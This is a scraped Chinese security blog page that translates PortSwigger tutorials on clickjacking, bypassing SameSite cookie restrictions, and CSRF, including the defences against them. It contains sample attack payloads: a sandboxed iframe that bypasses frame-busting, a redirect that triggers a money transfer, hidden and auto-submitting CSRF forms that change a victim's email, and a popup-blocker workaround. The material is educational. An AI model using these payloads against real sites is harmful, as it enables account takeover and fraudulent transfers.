<p>目标网站的iframe在浏览器中的位置经过精心设置，通过适当的宽度和高度位置值，使其目标操作与诱饵网站精确重叠。使用绝对和相对位置值，以确保无论屏幕大小、浏览器类型和平台如何，目标网站都能准确地与诱饵网站重叠。z - index决定了iframe和网站图层的堆叠顺序。透明度值设置为0.0（或接近0.0），这样iframe的内容对用户来说是透明的。浏览器的点击劫持防护可能会应用基于阈值的iframe透明度检测（例如，Chrome 76版本包含此功能，但Firefox没有）。攻击者会选择合适的透明度值，以达到预期效果而不触发防护机制。</p>
<h2 id="点击劫持工具（Clickbandit）"><a href="#点击劫持工具（Clickbandit）" class="headerlink" title="点击劫持工具（Clickbandit）"></a>点击劫持工具（Clickbandit）</h2><p>虽然你可以按照上述方法手动创建一个点击劫持的PoC，但在实际操作中这可能相当繁琐且耗时。当你在实际环境中测试点击劫持时，我们建议使用 Burp 的 Clickbandit 工具。它允许你使用浏览器在可框架化的页面上执行所需的操作，然后创建一个包含合适点击劫持覆盖层的 HTML 文件。你可以用它在几秒钟内生成一个交互式的PoC，而无需编写一行 HTML 或 CSS 代码。</p>
<h2 id="带有预填充表单输入的点击劫持"><a href="#带有预填充表单输入的点击劫持" class="headerlink" title="带有预填充表单输入的点击劫持"></a>带有预填充表单输入的点击劫持</h2><p>一些需要完成并提交表单的网站，允许在提交之前使用 GET 参数预填充表单输入。其他网站可能在表单提交前需要输入文本。由于 GET 值是 URL 的一部分，因此可以修改目标 URL 以包含攻击者选择的值，并且像基本点击劫持示例那样，将透明的 “提交” 按钮覆盖在诱饵网站上。</p>
<h2 id="破框脚本"><a href="#破框脚本" class="headerlink" title="破框脚本"></a>破框脚本</h2><p>只要网站可以被嵌入框架，就有可能发生点击劫持攻击。因此，防范技术基于限制网站的框架嵌入能力。一种常见的通过网络浏览器实施的客户端防护方法是使用破框脚本。这些脚本可以通过专有的浏览器 JavaScript 插件或扩展（如 NoScript）来实现。脚本通常设计为执行以下部分或全部行为：</p>
<ul>
<li>检查并确保当前应用窗口是主窗口或顶层窗口；</li>
<li>使所有框架可见；</li>
<li>防止点击不可见的框架；</li>
<li>拦截并向用户标记潜在的点击劫持攻击。<br>破框技术通常特定于浏览器和平台，而且由于 HTML 的灵活性，攻击者通常可以绕过这些防护。由于破框脚本是 JavaScript，浏览器的安全设置可能会阻止其运行，或者浏览器可能根本不支持 JavaScript。攻击者绕过破框脚本的一个有效方法是使用 HTML5 的 iframe sandbox 属性。当设置了 allow - forms 或 allow - scripts 值，且省略了 allow - top - navigation 值时，破框脚本就会失效，因为 iframe 无法检查自己是否是顶层窗口：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;victim_website&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://victim-website.com&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-forms&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>allow - forms和allow - scripts值允许在iframe内执行指定的操作，但禁止顶层导航。这既抑制了破框行为，又允许目标网站内的功能正常运行。</p>
<h2 id="点击劫持与-DOM-XSS-攻击相结合"><a href="#点击劫持与-DOM-XSS-攻击相结合" class="headerlink" title="点击劫持与 DOM XSS 攻击相结合"></a>点击劫持与 DOM XSS 攻击相结合</h2><p>到目前为止，我们将点击劫持视为一种独立的攻击。从历史上看，点击劫持曾被用于执行诸如增加 Facebook 页面 “点赞” 数之类的行为。然而，当点击劫持被用作另一种攻击（如 DOM XSS 攻击）的载体时，其真正的威力才会显现出来。假设攻击者首先识别出 XSS 漏洞利用方法，那么这种组合攻击的实现相对简单。然后将 XSS 漏洞利用与 iframe 目标 URL 相结合，这样用户点击按钮或链接时，就会随之执行 DOM XSS 攻击。</p>
<h2 id="多步骤点击劫持"><a href="#多步骤点击劫持" class="headerlink" title="多步骤点击劫持"></a>多步骤点击劫持</h2><p>攻击者对目标网站输入的操控可能需要多个操作。例如，攻击者可能想诱使用户从零售网站购买商品，因此在下单之前需要将商品添加到购物篮中。攻击者可以使用多个 div 或 iframe 来实现这些操作。从攻击者的角度来看，如果要使这些攻击有效且隐蔽，就需要相当高的精准度和谨慎度。</p>
<h2 id="如何防范点击劫持攻击"><a href="#如何防范点击劫持攻击" class="headerlink" title="如何防范点击劫持攻击"></a>如何防范点击劫持攻击</h2><p>我们已经讨论了一种常见的浏览器端防范机制，即破框脚本。然而，我们发现攻击者通常很容易绕过这些防护。因此，人们设计了服务器驱动的协议，以限制浏览器对 iframe 的使用，并防范点击劫持。<br>点击劫持是一种浏览器端行为，其是否成功取决于浏览器的功能以及是否符合现行的网络标准和最佳实践。服务器端对点击劫持的防护是通过定义和传达对 iframe 等组件使用的限制来实现的。然而，防护的实施取决于浏览器对这些限制的遵守和执行情况。服务器端防范点击劫持的两种机制是 X - Frame - Options 和内容安全策略（Content Security Policy）。</p>
<p>X - Frame - Options 最初作为 Internet Explorer 8 中的非官方响应头引入，并迅速在其他浏览器中得到采用。该头部允许网站所有者控制 iframe 或对象的使用，通过 deny 指令可以禁止在框架中包含网页：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X - Frame - Options: deny</span><br></pre></td></tr></table></figure>
<p>或者，使用 sameorigin 指令可以将框架嵌入限制在与网站相同的源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X - Frame - Options: sameorigin</span><br></pre></td></tr></table></figure>
<p>或者使用 allow - from 指令将框架嵌入限制在指定的网站：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X - Frame - Options: allow - from https://normal - website.com</span><br></pre></td></tr></table></figure>
<p>X - Frame - Options 在不同浏览器中的实现并不一致（例如，Chrome 76 版本或 Safari 12 不支持 allow - from 指令）。然而，当与内容安全策略一起正确应用，作为多层防御策略的一部分时，它可以有效地防范点击劫持攻击。</p>
<h2 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h2><p>内容安全策略（CSP）是一种检测和防范机制，可缓解诸如 XSS 和点击劫持等攻击。CSP 通常在 Web 服务器中作为返回头来实现，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content - Security - Policy: policy</span><br></pre></td></tr></table></figure>
<p>其中 policy 是由分号分隔的一系列策略指令字符串。CSP 向客户端浏览器提供有关允许的 Web 资源来源的信息，浏览器可以利用这些信息检测和拦截恶意行为。</p>
<p>推荐的防范点击劫持的方法是在应用程序的内容安全策略中加入 frame - ancestors 指令。frame - ancestors ‘none’ 指令的行为类似于 X - Frame - Options 的 deny 指令。frame - ancestors’self’ 指令大致等同于 X - Frame - Options 的 sameorigin 指令。以下 CSP 将框架嵌入仅白名单到同一域：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content - Security - Policy: frame - ancestors&#x27;self&#x27;;</span><br></pre></td></tr></table></figure>
<p>或者，框架嵌入可以限制在指定的网站：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content - Security - Policy: frame - ancestors normal - website.com;</span><br></pre></td></tr></table></figure>
<p>为了有效防范点击劫持和 XSS，CSP 需要精心开发、实施和测试，并且应该作为多层防御策略的一部分来使用。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>本文翻译自portswigger文章：</p>
<p>What is Clickjacking? Tutorial &amp; Examples | Web Security Academy<br>​portswigger.net&#x2F;web-security&#x2F;clickjacking</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/17/clickhijacking/" data-id="cm77tzvt60000kb6sek1s9h6v" data-title="CORS" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CSRF(3)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/16/CSRF(3)/" class="article-date">
  <time class="dt-published" datetime="2025-02-15T16:07:17.000Z" itemprop="datePublished">2025-02-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/16/CSRF(3)/">绕过 samesite限制</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>SameSite 是一种浏览器安全机制，用于确定网站的 cookie 在何时会被包含在源自其他网站的请求中。SameSite cookie 限制对多种跨站攻击提供了一定程度的防护，包括跨站请求伪造（CSRF）、跨站泄露以及一些跨域资源共享（CORS）漏洞利用。</p>
<p>自 2021 年起，如果颁发 cookie 的网站未明确设置自身的限制级别，Chrome 默认会应用宽松（Lax）的 SameSite 限制。这是一项提议的标准，我们预计其他主流浏览器未来也会采用这种做法。因此，为了全面测试跨站攻击向量，深入理解这些限制的工作原理以及如何有可能绕过它们至关重要。</p>
<p>在本节中，我们首先会介绍 SameSite 机制的工作方式，并阐明一些相关术语。然后，我们将探讨一些最常见的绕过这些限制的方法，这些方法能够在那些乍看之下似乎安全的网站上实现 CSRF 及其他跨站攻击。</p>
<p>SameSite cookie 语境下的 “Site”（站点） 是什么？<br>在 SameSite cookie 限制的语境中，“站点” 被定义为顶级域名（TLD），通常是类似.com 或.net 这样的，再加上域名的额外一级。这通常被称为 TLD + 1。</p>
<p>在判断一个请求是否属于同站请求时，URL 协议也会被纳入考量。这意味着，从<a target="_blank" rel="noopener" href="http://app.example.com到https//app.example.com%E7%9A%84%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%9C%A8%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BC%9A%E8%A2%AB%E8%A7%86%E4%B8%BA%E8%B7%A8%E7%AB%99%E9%93%BE%E6%8E%A5%E3%80%82">http://app.example.com到https://app.example.com的链接，在大多数浏览器中会被视为跨站链接。</a></p>
<p>SameSite cookie 的站点是什么？<br>注意<br>你可能会遇到 “有效顶级域名”（eTLD）这个术语。这只是一种对实际中被当作顶级域名的保留多部分后缀的表述方式，比如.co.uk。</p>
<p>“站点” 和 “源” 有什么区别？<br>“站点” 和 “源” 的区别在于它们的范围；“站点” 包含多个域名，而 “源” 只包含一个。尽管它们紧密相关，但重要的是不要互换使用这两个术语，因为混淆两者可能会带来严重的安全隐患。</p>
<p>如果两个 URL 共享完全相同的协议、域名和端口，则被认为具有相同的源。不过要注意，端口通常是从协议推断出来的。</p>
<p>源<br>站点与源的对比<br>从这个例子中你可以看到，“站点” 这个术语的定义不太精确，因为它只考虑了协议和域名的最后一部分。关键在于，这意味着跨源请求仍可能是同站请求，但反之则不成立。</p>
<p>请求来源	请求目标	同站？	同源？<br><a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a>	<a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a>	是	是<br><a target="_blank" rel="noopener" href="https://app.example.com/">https://app.example.com</a>	<a target="_blank" rel="noopener" href="https://intranet.example.com/">https://intranet.example.com</a>	是	否：域名不匹配<br><a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a>	<a target="_blank" rel="noopener" href="https://example.com:8080/">https://example.com:8080</a>	是	否：端口不匹配<br><a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a>	<a target="_blank" rel="noopener" href="https://example.co.uk/">https://example.co.uk</a>	否：eTLD 不匹配	否：域名不匹配<br><a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a>	<a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a>	否：协议不匹配	否：协议不匹配</p>
<p>这是一个重要的区别，因为这意味着任何能够实现任意 JavaScript 执行的漏洞，都可能被滥用来绕过同一站点中其他域名基于站点的防御机制。稍后在其中一个实验中我们会看到这样的例子。</p>
<p>SameSite 是如何工作的？<br>在引入 SameSite 机制之前，浏览器会在对颁发 cookie 的域名的每一个请求中都发送 cookie，即使该请求是由一个不相关的第三方网站触发的。SameSite 的工作原理是，让浏览器和网站所有者能够限制哪些跨站请求（如果有的话）应该包含特定的 cookie。这有助于减少用户遭受 CSRF 攻击的风险，CSRF 攻击会诱使受害者的浏览器发出一个请求，从而在存在漏洞的网站上触发有害操作。由于这些请求通常需要与受害者已认证会话相关联的 cookie，如果浏览器不包含这个 cookie，攻击就会失败。</p>
<p>目前所有主流浏览器都支持以下 SameSite 限制级别：</p>
<p>严格（Strict）<br>宽松（Lax）<br>无（None）<br>开发人员可以为他们设置的每个 cookie 手动配置一个限制级别，从而在使用这些 cookie 的时机上拥有更多控制权。要做到这一点，他们只需在 Set - Cookie 响应头中包含 SameSite 属性以及他们偏好的值：</p>
<p>Set - Cookie: session &#x3D; 0F8tgdOhi9ynR1M9wa3ODa; SameSite &#x3D; Strict<br>尽管这为抵御 CSRF 攻击提供了一定保护，但正如我们将在本节后面通过故意设置漏洞的交互式实验所展示的那样，这些限制都不能保证绝对免疫。</p>
<p>注意<br>如果颁发 cookie 的网站没有明确设置 SameSite 属性，Chrome 默认会自动应用宽松（Lax）限制。这意味着，即使开发人员从未配置过这种行为，该 cookie 也只会在满足特定条件的跨站请求中发送。由于这是一项提议的新标准，我们预计其他主流浏览器未来也会采用这种做法。</p>
<p>严格（Strict）<br>如果一个 cookie 设置了 SameSite &#x3D; Strict 属性，浏览器在任何跨站请求中都不会发送它。简单来说，这意味着如果请求的目标站点与浏览器地址栏中当前显示的站点不匹配，它就不会包含该 cookie。</p>
<p>在设置允许持有者修改数据或执行其他敏感操作的 cookie 时，比如访问仅对已认证用户可用的特定页面，建议使用这种设置。</p>
<p>虽然这是最安全的选项，但在需要跨站功能的情况下，它可能会对用户体验产生负面影响。</p>
<p>宽松（Lax）<br>宽松的 SameSite 限制意味着，浏览器会在跨站请求中发送 cookie，但仅当同时满足以下两个条件时：</p>
<p>请求使用 GET 方法。<br>请求是由用户的顶级导航导致的，比如点击链接。<br>这意味着，例如，在跨站 POST 请求中不会包含该 cookie。由于 POST 请求通常用于执行修改数据或状态的操作（至少根据最佳实践是这样），它们更有可能成为 CSRF 攻击的目标。</p>
<p>同样，在后台请求中，比如由脚本、iframe 或对图像及其他资源的引用发起的请求，也不会包含该 cookie。</p>
<p>无（None）<br>如果一个 cookie 设置了 SameSite &#x3D; None 属性，这实际上就完全禁用了 SameSite 限制，无论使用的是哪种浏览器。因此，浏览器会在对颁发该 cookie 的站点的所有请求中发送它，即使这些请求是由完全不相关的第三方站点触发的。</p>
<p>除了 Chrome 之外，这是其他主流浏览器在设置 cookie 时如果未提供 SameSite 属性的默认行为。</p>
<p>禁用 SameSite 是有合理原因的，比如当该 cookie 旨在从第三方上下文使用，并且不会授予持有者对任何敏感数据或功能的访问权限时。跟踪 cookie 就是一个典型的例子。</p>
<p>如果你遇到设置了 SameSite &#x3D; None 或没有明确限制的 cookie，值得研究一下它是否有任何用途。当 Chrome 首次采用 “默认宽松（Lax - by - default）” 行为时，产生了破坏许多现有网络功能的副作用。作为一种快速解决方法，一些网站选择简单地对所有 cookie 禁用 SameSite 限制，包括可能敏感的 cookie。</p>
<p>当设置 SameSite &#x3D; None 的 cookie 时，网站还必须包含 Secure 属性，以确保该 cookie 仅在通过 HTTPS 的加密消息中发送。否则，浏览器将拒绝该 cookie，并且它不会被设置。</p>
<p>Set - Cookie: trackingId &#x3D; 0F8tgdOhi9ynR1M9wa3ODa; SameSite &#x3D; None; Secure<br>通过 GET 请求绕过 SameSite 宽松限制<br>在实际情况中，服务器并不总是严格区分它们接收到的针对给定端点的请求是 GET 还是 POST，即使是那些期望表单提交的端点也是如此。如果它们对会话 cookie 使用宽松（Lax）限制，无论是明确设置还是由于浏览器默认设置，你仍然可能通过诱使受害者的浏览器发出 GET 请求来执行 CSRF 攻击。</p>
<p>只要请求涉及顶级导航，浏览器仍会包含受害者的会话 cookie。以下是发起此类攻击的最简单方法之一：</p>
<script>     
document.location = 'https://vulnerable - website.com/account/transfer - payment?recipient = hacker&amount = 1000000'; 
</script>
<p>即使普通的 GET 请求不被允许，一些框架也提供了覆盖请求行中指定方法的方式。例如，Symfony 在表单中支持_method 参数，出于路由目的，它优先于正常方法：</p>
<form action="https://vulnerable - website.com/account/transfer - payment" method="POST"> 
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker"> 
    <input type="hidden" name="amount" value="1000000"> 
</form>
其他框架也支持各种类似的参数。

<p>使用站内小工具绕过 SameSite 限制<br>如果一个 cookie 设置了 SameSite &#x3D; Strict 属性，浏览器不会在任何跨站请求中包含它。如果你能找到一个能在同一站点内引发二次请求的小工具，就有可能绕过这个限制。</p>
<p>一种可能的小工具是客户端重定向，它使用攻击者可控制的输入（如 URL 参数）动态构建重定向目标。有关示例，请参阅我们关于基于 DOM 的开放式重定向的资料。</p>
<p>就浏览器而言，这些客户端重定向根本不算真正的重定向；产生的请求仅被视为普通的独立请求。最重要的是，这是一个同站请求，因此，无论存在何种限制，它都会包含与该站点相关的所有 cookie。</p>
<p>如果你能操纵这个小工具引发恶意的二次请求，这就能让你完全绕过任何 SameSite cookie 限制。</p>
<p>请注意，服务器端重定向无法进行等效攻击。在这种情况下，浏览器会识别出跟随重定向的请求最初源自跨站请求，所以它们仍然会应用适当的 cookie 限制。</p>
<p>通过有漏洞的兄弟域名绕过 SameSite 限制<br>无论你是在测试他人的网站还是试图保护自己的网站，都必须牢记，即使请求是跨源发出的，它仍可能是同站请求。</p>
<p>确保你全面审查所有可用的攻击面，包括任何兄弟域名。特别是，能够让你引发任意二次请求的漏洞，如跨站脚本（XSS），可能会完全破坏基于站点的防御机制，使该站点的所有域名都面临跨站攻击。</p>
<p>除了经典的 CSRF 之外，不要忘记，如果目标网站支持 WebSocket，此功能可能容易受到跨站 WebSocket 劫持（CSWSH）的攻击，这本质上就是针对 WebSocket 握手的 CSRF 攻击。有关更多详细信息，请参阅我们关于 WebSocket 漏洞的主题。</p>
<p>利用新颁发的 cookie 绕过 SameSite 宽松限制<br>具有宽松 SameSite 限制的 cookie 通常不会在任何跨站 POST 请求中发送，但也有一些例外情况。</p>
<p>如前所述，如果网站在设置 cookie 时未包含 SameSite 属性，Chrome 默认会自动应用宽松限制。然而，为了避免破坏单点登录（SSO）机制，在顶级 POST 请求的前 120 秒内，它实际上不会强制执行这些限制。因此，存在一个两分钟的窗口期，在此期间用户可能容易受到跨站攻击。</p>
<p>注意<br>这个两分钟的窗口期不适用于明确设置了 SameSite &#x3D; Lax 属性的 cookie。</p>
<p>试图将攻击时间安排在这个短暂的窗口期内有点不切实际。另一方面，如果你能在网站上找到一个小工具，使你能够迫使受害者获得一个新的会话 cookie，你可以在进行主要攻击之前抢先刷新他们的 cookie。例如，完成基于 OAuth 的登录流程每次可能会产生一个新会话，因为 OAuth 服务不一定知道用户是否仍登录到目标网站。</p>
<p>为了在受害者无需再次手动登录的情况下触发 cookie 刷新，你需要使用顶级导航，这可确保包含与他们当前 OAuth 会话相关的 cookie。这带来了一个额外的挑战，因为你随后需要将用户重定向回你的网站，以便发起 CSRF 攻击。</p>
<p>或者，你可以从新标签页触发 cookie 刷新，这样在你能够实施最终攻击之前，浏览器不会离开当前页面。这种方法的一个小问题是，除非通过手动交互打开，否则浏览器会阻止弹出标签页。例如，以下弹出窗口默认会被浏览器阻止：</p>
<p>window.open(‘<a target="_blank" rel="noopener" href="https://vulnerable/">https://vulnerable</a> - website.com&#x2F;login&#x2F;sso’);<br>为了解决这个问题，你可以将该语句包装在一个 onclick 事件处理程序中，如下所示：</p>
<p>window.onclick &#x3D; () &#x3D;&gt; {     window.open(‘<a target="_blank" rel="noopener" href="https://vulnerable/">https://vulnerable</a> - website.com&#x2F;login&#x2F;sso’); }<br>这样，window.open () 方法仅在用户在页面上的某个位置点击时才会被调用。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/16/CSRF(3)/" data-id="cm76frhkt0000sv6s66wo9hlz" data-title="绕过 samesite限制" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CSRF(1)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/15/CSRF(1)/" class="article-date">
  <time class="dt-published" datetime="2025-02-14T16:07:17.000Z" itemprop="datePublished">2025-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/15/CSRF(1)/">CSRF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在本节中，我们将解释什么是跨站请求伪造，列举一些常见的 CSRF 漏洞示例，并说明如何防范 CSRF 攻击。</p>
<h2 id="什么是-CSRF？"><a href="#什么是-CSRF？" class="headerlink" title="什么是 CSRF？"></a>什么是 CSRF？</h2><p>跨站请求伪造（也称为 CSRF）是一种网络安全漏洞，攻击者可利用该漏洞诱使用户执行他们本无意执行的操作。它使攻击者能够部分绕过同源策略，而同源策略旨在防止不同网站相互干扰。</p>
<h2 id="CSRF-攻击的影响是什么？"><a href="#CSRF-攻击的影响是什么？" class="headerlink" title="CSRF 攻击的影响是什么？"></a>CSRF 攻击的影响是什么？</h2><p>在成功的 CSRF 攻击中，攻击者会使受害用户无意中执行某项操作。例如，这可能是更改其账户的电子邮件地址、更改密码或进行资金转账。根据操作的性质，攻击者可能能够完全控制用户的账户。如果被入侵的用户在应用程序中具有特权角色，那么攻击者可能能够完全控制应用程序的所有数据和功能。</p>
<h2 id="CSRF-是如何运作的？"><a href="#CSRF-是如何运作的？" class="headerlink" title="CSRF 是如何运作的？"></a>CSRF 是如何运作的？</h2><p>要实现 CSRF 攻击，必须满足三个关键条件：</p>
<p>相关操作。应用程序中存在攻击者有理由诱导用户执行的操作。这可能是一个特权操作（例如修改其他用户的权限），或者是对用户特定数据执行的任何操作（例如更改用户自己的密码）。</p>
<p>基于 Cookie 的会话处理。执行该操作涉及发出一个或多个 HTTP 请求，并且应用程序仅依赖会话 Cookie 来识别发出请求的用户。不存在其他用于跟踪会话或验证用户请求的机制。</p>
<p>请求参数可预测。执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，在诱使用户更改密码时，如果攻击者需要知道现有密码的值，那么该功能就不存在漏洞。 例如，假设一个应用程序包含一个允许用户更改其账户电子邮件地址的功能。当用户执行此操作时，他们会发出如下 HTTP 请求：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span><br><span class="line"></span><br><span class="line">email=wiener@normal-user.com</span><br></pre></td></tr></table></figure>
<p>这满足了 CSRF 所需的条件：</p>
<p>攻击者会对更改用户账户电子邮件地址的操作感兴趣。执行此操作后，攻击者通常能够触发密码重置并完全控制用户的账户。<br>应用程序使用会话 Cookie 来识别发出请求的用户。<br>不存在其他用于跟踪用户会话的令牌或机制。<br>攻击者可以轻松确定执行该操作所需的请求参数的值。<br>在满足这些条件的情况下，攻击者可以构建一个包含以下 HTML 的网页：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果受害用户访问攻击者的网页，将会发生以下情况：</p>
<p>攻击者的页面将触发对存在漏洞的网站的 HTTP 请求。如果用户已登录到存在漏洞的网站，其浏览器将自动在请求中包含其会话 Cookie（假设未使用 SameSite Cookie）。<br>存在漏洞的网站将以正常方式处理该请求，将其视为由受害用户发出的请求，并更改其电子邮件地址。<br>注意<br>虽然 CSRF 通常是在基于 Cookie 的会话处理的背景下进行描述，但它也会出现在其他情况下，即应用程序自动将一些用户凭证添加到请求中，例如 HTTP 基本认证和基于证书的认证</p>
<h2 id="如何构建-CSRF-攻击"><a href="#如何构建-CSRF-攻击" class="headerlink" title="如何构建 CSRF 攻击"></a>如何构建 CSRF 攻击</h2><p>手动创建 CSRF 利用所需的 HTML 可能很麻烦，特别是当所需的请求包含大量参数或请求存在其他特殊情况时。构建 CSRF 利用的最简单方法是使用 Burp Suite Professional 内置的 CSRF PoC 生成器：</p>
<p>在 Burp Suite Professional 中的任何位置选择您要测试或利用的请求。<br>从右键上下文菜单中，选择 “Engagement tools（参与工具）”&#x2F;“Generate CSRF PoC（生成 CSRF PoC）”。<br>Burp Suite 将生成一些 HTML，这些 HTML 将触发所选的请求（不包含 Cookie，Cookie 将由受害者的浏览器自动添加）。<br>您可以在 CSRF PoC 生成器中调整各种选项，以微调攻击的各个方面。在某些不寻常的情况下，您可能需要这样做，以处理请求的特殊功能。<br>将生成的 HTML 复制到一个网页中，在已登录到存在漏洞的网站的浏览器中查看该网页，并测试预期的请求是否成功发出以及所需的操作是否发生。</p>
<h2 id="如何实施-CSRF-攻击"><a href="#如何实施-CSRF-攻击" class="headerlink" title="如何实施 CSRF 攻击"></a>如何实施 CSRF 攻击</h2><p>跨站请求伪造攻击的实施机制与反射型 XSS 基本相同。通常，攻击者会将恶意 HTML 放置在他们控制的网站上，然后诱使受害者访问该网站。这可能通过向用户发送指向该网站的链接来实现，例如通过电子邮件或社交媒体消息。或者，如果攻击被放置在一个热门网站上（例如，在用户评论中），他们可能只需等待用户访问该网站。</p>
<p>请注意，一些简单的 CSRF 攻击采用 GET 方法，并且可以通过存在漏洞的网站上的单个 URL 完全独立实现。在这种情况下，攻击者可能不需要使用外部网站，而是可以直接向受害者提供存在漏洞的域上的恶意 URL。在前面的示例中，如果更改电子邮件地址的请求可以使用 GET 方法执行，那么一个独立的攻击看起来可能如下：</p>
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
## 防范CSRF的常见措施
如今，成功发现并利用CSRF漏洞通常需要绕过目标网站、受害者浏览器或两者部署的反CSRF措施。您会遇到的最常见防御措施如下：

<p>CSRF 令牌 - CSRF 令牌是由服务器端应用程序生成并与客户端共享的唯一、保密且不可预测的值。当尝试执行敏感操作（例如提交表单）时，客户端必须在请求中包含正确的 CSRF 令牌。这使得攻击者很难代表受害者构造有效的请求。<br>SameSite Cookie - SameSite 是一种浏览器安全机制，用于确定网站的 Cookie 何时包含在源自其他网站的请求中。由于执行敏感操作的请求通常需要经过身份验证的会话 Cookie，适当的 SameSite 限制可能会阻止攻击者跨站触发这些操作。自 2021 年起，Chrome 默认强制执行 Lax SameSite 限制。由于这是提议的标准，我们预计其他主流浏览器未来也会采用这种行为。<br>基于 Referer 的验证 - 一些应用程序利用 HTTP Referer 标头来尝试防范 CSRF 攻击，通常是通过验证请求是否源自应用程序自身的域。这通常不如 CSRF 令牌验证有效。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/15/CSRF(1)/" data-id="cm74z60hq0000ve6scuxaa6ty" data-title="CSRF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CSRF(2)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/15/CSRF(2)/" class="article-date">
  <time class="dt-published" datetime="2025-02-14T16:07:17.000Z" itemprop="datePublished">2025-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/15/CSRF(2)/">绕过 CSRF 令牌验证</a>
    </h1>
  

      </header>
    
